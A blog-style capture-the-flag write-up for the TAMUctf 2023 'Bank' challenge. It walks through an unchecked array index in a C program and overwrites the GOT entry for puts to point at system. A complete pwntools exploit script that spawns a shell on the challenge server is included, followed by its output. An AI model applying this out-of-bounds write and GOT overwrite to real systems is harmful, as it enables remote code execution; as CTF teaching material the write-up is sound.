---
title: "TAMUctf 2023"
date: 2023-05-01T13:26:08+10:00
draft: false
tags: ['pwn']
---
<!--more-->
# Bank {#bank}

We're given three files.
- bank (ELF 64-bit)
- bank.c
- libc.so.6

Looks like we're going to have to ret2libc at some point so lets see where that's going to happen. Below is the source from `bank.c`.
```c
#include <stdio.h>

long accounts[100];
char exit_msg[] = "Have a nice day!";

void deposit() {
    int index = 0;
    long amount = 0;
    puts("Enter the number (0-100) of the account you want to deposit in: ");
    scanf("%d", &index);
    puts("Enter the amount you want to deposit: ");
    scanf("%ld", &amount);
    accounts[index] += amount;
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    deposit();
    deposit();
    puts(exit_msg);
}
```
Okay, it's pretty short. First thing I notice is that the `deposit()` function gives us write capabilities with a bit of a catch. So take a look at these lines in particular.
```c
    puts("Enter the number (0-100) of the account you want to deposit in: ");
    scanf("%d", &index);
    puts("Enter the amount you want to deposit: ");
    scanf("%ld", &amount);
    accounts[index] += amount;
```
So we can give an arbitrary 'account number' and 'amount' which will be used to index and add to the array respectively. That means we can provide an integer offset to any address and add some amount to the value stored at that location.
Before we get to excited lets `checksec` the binaries we were given.
```zsh
└─$ checksec --file=bank       
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   68 Symbols        No    0               0               bank

└─$ checksec --file=libc.so.6  
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    DSO             No RPATH   No RUNPATH   No Symbols        Yes   79              170             libc.so.6
```
The notable missing protections are `RELRO` and `PIE` on the `bank` binary. That means there's no address randomisation and we can freely overwrite GOT entries.
So the plan is straight forward from here.

1. Find the GOT entry that points to `puts` in libc (We know there's an entry for `puts` since the binary uses it and there's no PIE so we just have to check the binary for where that entry is)
2. Use `deposit()` to add whatever offset we need to get to a function like `system()`

The only issue now is that we need to pass a command to `system()` when it gets called. I think the best option would be to overwrite a string that `puts()` uses to include `;/bin/sh`. Luckily there's an exit message that gets defined in the `bank` binary and is called at the end of the program.
```c
#include <stdio.h>

long accounts[100];
char exit_msg[] = "Have a nice day!";

//...snip...

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    deposit();
    deposit();
    puts(exit_msg);
}
```
Sweet, so we'll use the first `deposit()` call to modify the `exit_msg` to include `;/bin/sh` and the second one to overwrite the GOT entry for `puts` to point to `system`.
We can script that using pwntools, as shown below.
```python
from pwn import *

io = remote("tamuctf.com", 443, ssl=True, sni="bank")
elf = ELF('./bank')
libc = ELF('./libc.so.6')

def puts_to_system():
    gotputs_off = (elf.got['puts']-elf.symbols['accounts'])//8 # Find the offset we need to index in the array based on the location of our 'accounts' array.
    log.success("Calculated offset " + str(hex(gotputs_off)) + ' : ' + str(hex(elf.symbols['accounts'])) + ' - ' + str(hex(elf.got['puts']))) # Log our calculations.
    io.sendline(bytes(str(gotputs_off),'ascii')) # Send the index
    io.sendline(bytes(str(libc.symbols['system']-libc.symbols['puts']),'ascii')) # Send the offset between puts and system in libc

def corrupt_exitmsg():
    exitmsg_addr = next(elf.search(b'Have a nice day!')) # Find the address of the exit message in the bank binary
    log.success("Exit message string found at " + str(hex(exitmsg_addr)))
    exitmsg_off = (exitmsg_addr-elf.symbols['accounts']+0x10)//8 # Calculate the index in the array that will land us at the exitmsg in memory, we add 0x10 to get to the end of the string. We overwrite the null byte at the end of the string.
    io.sendline(bytes(str(exitmsg_off),'ascii')) # Send the index
    io.sendline((str(u64(b';/bin/sh'.ljust(8,b'\x00'))))) # Send the ';/bin/sh' string as an integer with null bytes to terminate the string. Note that in memory there were null bytes after the string, so when we send our integer it is equivelent to just writing whatever we want.

corrupt_exitmsg() # Corrupt the message
puts_to_system() # Change puts GOT entry to point to system

io.interactive()
```
Running that, we get a shell and the flag.
```zsh
└─$ python3 solver-template.py      
[+] Opening connection to tamuctf.com on port 443: Done
[+] Calculated offset -0x10 : 0x403460 - 0x4033e0
[*] Switching to interactive mode
Enter the number (0-100) of the account you want to deposit in: 
Enter the amount you want to deposit: 
Enter the number (0-100) of the account you want to deposit in: 
Enter the amount you want to deposit: 
sh: 1: Have: not found
$ ls
bank
docker_entrypoint.sh
flag.txt
$ cat flag.txt
gigem{a_v3ry_h3fty_d3p0s1t}
```
> gigem{a_v3ry_h3fty_d3p0s1t}
